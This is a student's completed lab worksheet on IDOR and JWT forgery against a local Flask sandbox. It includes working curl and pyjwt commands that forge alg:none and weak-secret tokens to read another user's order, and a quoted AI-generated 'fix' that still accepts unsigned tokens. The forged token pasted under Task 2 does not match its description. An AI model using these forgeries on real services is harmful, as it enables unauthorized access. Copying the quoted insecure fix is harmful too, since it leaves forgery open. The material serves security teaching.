# Worksheet 6 — Authentication, Sessions & Access Control (3 hrs)

> **Course:** Software Security (KOSEN69) · **Week 6**
> **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
> **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.

> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.

## Part 1 — Student Information

| Name | Student ID | Date | Group | AI Tool |
|---|---|---|---|---|
| Thura Aung | 6631503094 | 11.September.2026 | - | ChatGPT |

![Diagram of one request passing two gates: Gate 1 authentication accepts an alg:none forgery, a weak-secret forgery, and alice's real token, then Gate 2 authorization fails to check ownership so alice's valid token reads bob's /api/orders/2 as IDOR, with the solution_app.py fixes for both.](img/authn-vs-authz.svg)

## Part 2 — Lecture Questions

Answer in 2–4 sentences each.

1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result (L63) — which of the two is missing?

 - Authentication verifies who the user is, while authorization verifies what that user is allowed to access. In `vulnerable_app.py`, `current_user()` authenticates the caller, but `get_order` ignores the username and never checks order ownership. Therefore, authorization is missing.

2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what single check in `solution_app.py` (L64) closes it?

- IDOR is insecure direct object reference, where changing an object identifier exposes someone else's data. `/api/orders/<oid>` is exploitable because any authenticated user can replace `oid` with another user's order ID. The check `if order["owner"] != user: return jsonify(error="forbidden"), 403` in `solution_app.py` closes the vulnerability.

3. Explain the **`alg:none`** JWT attack. Why does listing `"none"` in `algorithms=[...]` (L55) let an attacker submit an *unsigned* token?

- In an `alg:none` attack, an attacker creates a JWT with `sub: "bob"` but no cryptographic signature. Because the vulnerable code accepts the `none` algorithm and disables signature verification with `options={"verify_signature": False}`, it trusts the attacker-controlled claims. Pinning verification to `HS256` prevents unsigned tokens from being accepted.

4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?

- The hardcoded secret `"secret"` is easy to guess, allowing an attacker to create a correctly signed HS256 token for any username. A strong random secret makes forging a valid signature computationally impractical. Pinning the algorithm to HS256 also prevents an attacker from switching the token to the unsigned `none` algorithm.

5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?

- The `exp` claim limits how long a token remains valid, reducing the impact of stolen or replayed tokens. The `aud` claim restricts the token to its intended application or audience. The secure version requires both claims so tokens without an expiry or correct audience are rejected.

## Part 3 — Hands-on Lab (150 min)

**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.

**Prerequisites:** Docker + Docker Compose, `curl`, `python3` with `pyjwt`, optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.

### Environment setup

```bash
cd labs/week06-authn-authz
docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
# vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
```
Optional secondary target / proxy:
```bash
docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
# Burp Suite: put the proxy listener AND the browser proxy on 127.0.0.1:8081.
# NOT 8080 — the lab app already owns host 8080 (docker-compose.yml, "8080:5000").
# Burp's own default listener is 8080, so you must change it: leave it there and
# either the listener refuses to start ("Address already in use") or, if it does
# bind, the browser's proxy address is the target's address and every request
# goes straight to the app instead of through Burp — you intercept nothing.
```

**What to submit per task:** the exact **command/token**, a **screenshot** of the JSON response, and a **2–3 sentence mitigation**.

---

**Task 0 — Onboarding (5 min).** Get alice's token (from `attack.md`):
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOKEN"
```
Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*

![alt text](image.png)

**Task 1 — IDOR Treasure Hunt (30 min) 🗺️.**
- *Goal:* read **bob's** order with **alice's** token.
- *Steps:*
  ```bash
  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
  ```
- *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.

```sim
jwt-forge
```
Task 1

![alt text](image-1.png)

- **Why the missing ownership check is the root cause:** The application verifies that Alice has a valid login token, but it never checks whether the requested order belongs to Alice. Because the server trusts the user-controlled `oid` and returns any matching order, Alice can change `/api/orders/1` to `/api/orders/2` and read Bob's data. This is an IDOR vulnerability classified as CWE-639; checking `order["owner"] != user` and returning `403 Forbidden` prevents the unauthorized access.

**Task 2 — JWT Forgery via alg:none (30 min) 🔏.**
- *Goal:* impersonate bob with an **unsigned** token (no secret needed).
- *Steps:*
  ```bash
  FORGED=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
  ```
- *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).

Task 2

The forged token

> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSJ9.c3brGQkxoiCgrl5LGiV0go9qgN0MtrdnDBCCfJ45f_Q

![alt text](image-2.png)

- **Explanation of the `none` flaw (CWE-347):** The attacker changes the JWT header to use `alg: "none"`, changes the payload to claim `sub: "bob"`, and removes the signature. The vulnerable application accepts this algorithm and disables signature verification, so it trusts the attacker-controlled identity without proving that the token was signed by the server. The secure fix pins verification to `HS256` and requires a valid signature, causing unsigned tokens to be rejected.

**Task 3 — JWT Forgery via weak secret (30 min) 🔏.**
- *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
- *Steps:*
  ```bash
  FORGED2=$(python3 - <<'PY'
  import jwt
  print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
  PY
  )
  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
  ```
- *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.

Task 3

![alt text](image-4.png)

- The application uses the weak hardcoded secret "secret" to sign HS256 tokens. Because the secret is easy to guess, an attacker can create a valid token with sub: "bob" without knowing Bob’s password. A strong random secret stored securely would prevent attackers from generating valid signatures.

**Task 4 — Privilege/identity escalation reasoning (25 min).**
- *Goal:* combine the flaws. Using Task 2/3 you became `bob` *without his password*; using Task 1 you read objects you don't own.
- *Steps:* document the full attack chain (forge token → access any `oid`). Optionally replay the requests through **Burp Suite Repeater** and screenshot the intercepted request/response.
- *Deliverable:* a short chain diagram/paragraph + Burp (or curl) evidence.

Task 4

![alt text](image-5.png)

```text
Attacker guesses weak secret "secret"
              |
              v
Forge JWT: {"sub": "bob"}
              |
              v
Vulnerable app accepts forged token
              |
              v
Request /api/orders/2
              |
              v
Bob's order is disclosed (IDOR / CWE-639)
```

- I forged a JWT claiming to be Bob using the weak secret "secret". The vulnerable application accepted the token and returned Bob’s order because it did not check whether the requested order belonged to the authenticated user. This combines weak JWT authentication with IDOR and exposes another user’s data without their password.

**Task 5 — Defend / fix it (30 min) 🛡️.**
- *Goal:* prove `solution_app.py` blocks Tasks 1–3.
- *Steps:* stop the vulnerable container (`Ctrl-C`), then:
  ```bash
  docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"
  ```
  Re-run: get a fresh alice token, then re-fire each attack. Expected: `/api/orders/2` with alice's token → **403 forbidden** (ownership check, L64); the `alg:none` token → **401 invalid token** (algorithm pinned to HS256, L50); the `"secret"` token → **401** (strong random secret + required `aud`/`exp`, L10/40).
- *Deliverable:* screenshots of the 403 and both 401s + name the fix line for each.

Task 5

**Evidence 1 — IDOR blocked: 403 Forbidden**

![alt text](image-6.png)

**Evidence 2 — Unsigned `alg:none` token blocked: 401 Unauthorized**

![alt text](image-7.png)

**Evidence 3 — Weak-secret token blocked: 401 Unauthorized**

![alt text](image-9.png)

**Fix lines:**

- **Evidence 1, IDOR:** `solution_app.py` — `if order["owner"] != user: return jsonify(error="forbidden"), 403` (ownership check).
- **Evidence 2, `alg:none`:** `solution_app.py` — `jwt.decode(token, SECRET, algorithms=["HS256"], audience=AUDIENCE, options={"require": ["exp", "aud"]})` (algorithm pinning and signature verification).
- **Evidence 3, weak secret:** `solution_app.py` — `SECRET = os.environ.get("JWT_SECRET") or os.urandom(32).hex()` (strong random secret), together with the required `exp` and `aud` claims in the login payload.

**Task 5 expected results:**

| Attack | Expected result | Fix |
|---|---|---|
| Alice requests Bob's order | **403 Forbidden** | Ownership check in `solution_app.py` |
| Unsigned `alg:none` token | **401 Unauthorized** | HS256 is pinned during decoding |
| Forged token signed with `"secret"` | **401 Unauthorized** | Strong random secret plus required `aud` and `exp` claims |


## Part 4 — Reflection

1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.

  - **Answer:** The IDOR vulnerability maps to CWE-639, Insecure Direct Object Reference, and OWASP A01 Broken Access Control. The `alg:none` forgery maps to CWE-347, Improper Verification of Cryptographic Signature, while the guessable hardcoded secret maps to CWE-321, Use of Hard-coded Cryptographic Key. These JWT problems are related to OWASP A07 Authentication Failures.

2. **Real breach:** the **2022 Optus breach** exposed millions of customer records via an exposed/poorly-authorized API endpoint where identifiers could be enumerated — a textbook broken-access-control / IDOR-style failure. In 3–4 sentences connect it to Tasks 1 and 4 of this lab. *(Alternative: the Peloton API IDOR disclosure.)*

  - **Answer:** The 2022 Optus breach was similar to Task 1 because attackers could use identifiers to access customer records through an API that did not enforce authorization correctly. Like Task 4, changing an identifier or request allowed access to data belonging to another user without legitimate permission. The lesson is that authentication alone is not enough; the server must check ownership and permissions for every requested object. Strong token verification would also help protect identity, but it cannot replace object-level authorization.

3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?

  - **Answer:** The deny-by-default ownership check protects the most attack surface because it prevents users from reading or modifying objects they do not own, even when a token is valid. Server-side authorization is non-negotiable because clients can change object IDs, tokens, and requests, so client-side checks cannot be trusted. Algorithm pinning and a strong managed secret protect token authenticity, but they do not prove that the authenticated user is authorized to access a particular order. All three controls are therefore needed together.

## Grading rubric (100)

| Criterion | Points |
|-----------|-------:|
| Part 2 — Lecture questions (conceptual accuracy) | 20 |
| Part 3 — Exploitation + evidence (payloads/tokens + screenshots, Tasks 1–4) | 40 |
| Part 3 — Defense (Task 5: fixes proven, lines cited) | 25 |
| Part 4 — Reflection (CWE/OWASP mapping, breach, mitigation) | 15 |
| **Total** | **100** |

---

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** FLAG{idor_demo}

  violation. How to submit: **learn.zcr.ai/submit** (full guide: `SUBMISSION.md` in the repo root).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
1. What did you do, and **why did the vulnerability work**?

-  I logged in as Alice, changed the order ID to Bob's order, and then tested forged JWTs claiming to be Bob. The attacks worked because the vulnerable application accepted unsigned or weakly signed tokens and checked only that a token existed, not whether the requested order belonged to the authenticated user.

  2. **Why does your fix actually stop it** — and what could still break it?

- The fix pins JWT verification to HS256, uses a strong random secret, requires `aud` and `exp`, and checks order ownership before returning data. These controls stop the tested attacks because forged tokens fail verification and cross-user requests return `403 Forbidden`. The application could still be at risk if the secret is leaked, expiry or audience validation is removed, another endpoint omits authorization, or a future code change bypasses the centralized security checks.

---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.
2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).
3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.

> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.

### AI answer tested

> Replace the vulnerable `current_user()` with the following code:
>
> ```python
> def current_user():
>     token = request.headers.get("Authorization", "").replace("Bearer ", "")
>     return jwt.decode(token, "secret", algorithms=["HS256", "none"]).get("sub")
> ```
>
> This verifies the token and supports both signed and unsigned JWTs.

### Critique

The answer is unsafe because it keeps the guessable hardcoded secret `"secret"` and explicitly allows the `none` algorithm. An attacker could create an unsigned token or forge an HS256 token claiming to be another user. It also fixes only authentication and does not add the required ownership check in `get_order`, so a valid token could still read another user's order. The correct implementation must pin the algorithm to `HS256`, use a strong managed secret, require `exp` and `aud`, and check ownership on every object request.

### Correct verified version

```python
data = jwt.decode(
  token,
  SECRET,
  algorithms=["HS256"],
  audience=AUDIENCE,
  options={"require": ["exp", "aud"]},
)
user = data.get("sub")
if order["owner"] != user:
  return jsonify(error="forbidden"), 403
```

The verified results were **403 Forbidden** for Alice requesting Bob's order and **401 invalid token** for both the unsigned `alg:none` token and the token signed with the old weak secret. Therefore, the AI answer was insufficient because it preserved both JWT forgery paths and omitted object-level authorization.

---

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.

**Answer:** The endpoint reads the order number from the URL and returns that order after decoding a bearer token. It is exploitable because the old code accepts an unsigned or weakly signed token and does not compare the logged-in username with the order owner. As a result, an attacker can pretend to be Bob or use Alice's token to request Bob's order.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.
*Graded on the prompt's precision and your verification — this trains problem decomposition and AI literacy (Denny et al. 2024).*

**Final prompt:**

> Fix the Week 6 Flask JWT endpoint in `solution_app.py`. Keep the public API unchanged. Use a strong secret from `JWT_SECRET` with a secure random fallback, issue tokens containing `sub`, `aud`, and a short-lived `exp`, and decode tokens with only `algorithms=["HS256"]`, the expected audience, and required `aud`/`exp` claims. In `GET /api/orders/<oid>`, catch invalid JWT errors and return 401; then return 403 unless `order["owner"] == user`. Do not accept `alg:none`, the hardcoded secret `"secret"`, client-supplied ownership, or missing claims. Include a short test plan for the IDOR, `alg:none`, and weak-secret attacks.

**Verified result:** After applying the fix, Alice's request for `/api/orders/2` returned **403 Forbidden**. The unsigned `alg:none` token and the HS256 token signed with `"secret"` both returned **401 invalid token**, confirming that the prompt produced a secure fix for the tested attacks.
